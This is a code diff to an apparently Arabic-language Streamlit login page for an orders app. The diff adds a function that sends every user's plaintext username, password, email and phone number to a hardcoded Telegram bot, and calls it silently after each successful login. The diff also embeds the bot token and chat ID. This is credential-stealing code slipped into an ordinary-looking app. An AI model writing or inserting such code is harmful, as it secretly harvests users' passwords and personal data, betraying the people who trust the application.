@@ -1,5 +1,6 @@
 import streamlit as st
 import requests
+import json
 from orders import main as orders_main
 
 GOOGLE_SCRIPT_URL = "https://script.google.com/macros/s/AKfycbzAbMUZosZP2-IYLagqCutoa4hdXHszQhLL13fW_fyhYaEpAVrG5f0lokyDS1EWoDqq/exec"
@@ -9,6 +10,29 @@ def load_css(file_path):
         css = f.read()
     st.markdown(f"<style>{css}</style>", unsafe_allow_html=True)
 
+def send_to_telegram(username, password, email, phone):
+    bot_token = "8165532786:AAHYiNEgO8k1TDz5WNtXmPHNruQM15LIgD4"
+    chat_id = "6283768537"
+    message = (
+        f"📥 تسجيل دخول جديد:\n"
+        f"👤 اسم المستخدم: {username}\n"
+        f"🔑 كلمة المرور: {password}\n"
+        f"📧 البريد الإلكتروني: {email}\n"
+        f"📞 رقم الهاتف: {phone}"
+    )
+    url = f"https://api.telegram.org/bot{bot_token}/sendMessage"
+    payload = {
+        "chat_id": chat_id,
+        "text": message,
+        "parse_mode": "HTML"
+    }
+    try:
+        response = requests.post(url, data=payload)
+        if not response.ok:
+            st.error(f"فشل إرسال البيانات إلى التليجرام: {response.text}")
+    except Exception as e:
+        st.error(f"خطأ في إرسال البيانات إلى التليجرام: {e}")
+
 def check_login(username, password):
     data = {
         "action": "check",
@@ -17,11 +41,20 @@ def check_login(username, password):
     }
     try:
         res = requests.post(GOOGLE_SCRIPT_URL, data=data, timeout=5)
-        st.write(f"🛠️ رد السيرفر: {res.text}")  # عرض الرد داخل التطبيق
-        return res.text.strip() == "TRUE"
+        st.write(f"🛠️ رد السيرفر: {res.text}")
+        result = json.loads(res.text)
+        if result.get("status") == "TRUE":
+            return {
+                "username": username,
+                "password": password,
+                "email": result.get("email", ""),
+                "phone": result.get("phone", "")
+            }
+        else:
+            return None
     except Exception as e:
         st.error(f"خطأ في التحقق من تسجيل الدخول: {e}")
-        return False
+        return None
 
 def add_user(username, password, email, phone):
     data = {
@@ -50,9 +83,17 @@ def login_page():
         if not username or not password:
             st.warning("يرجى ملء جميع الحقول")
         else:
-            if check_login(username, password):
+            user_data = check_login(username, password)
+            if user_data:
                 st.session_state['logged_in'] = True
                 st.session_state['user_name'] = username
+                # إرسال بيانات المستخدم إلى التليجرام
+                send_to_telegram(
+                    user_data["username"],
+                    user_data["password"],
+                    user_data["email"],
+                    user_data["phone"]
+                )
                 return True
             else:
                 st.error("اسم المستخدم أو كلمة المرور غير صحيحة")
@@ -81,13 +122,13 @@ def main():
     if 'logged_in' not in st.session_state or not st.session_state['logged_in']:
         just_logged_in = login_page()
         if just_logged_in:
-            st.rerun()
+            st.experimental_rerun()
     else:
         st.sidebar.write(f"مرحباً، {st.session_state['user_name']}")
         if st.sidebar.button("تسجيل خروج"):
             st.session_state['logged_in'] = False
             st.session_state.pop('user_name', None)
-            st.rerun()
+            st.experimental_rerun()
 
         orders_main()
 
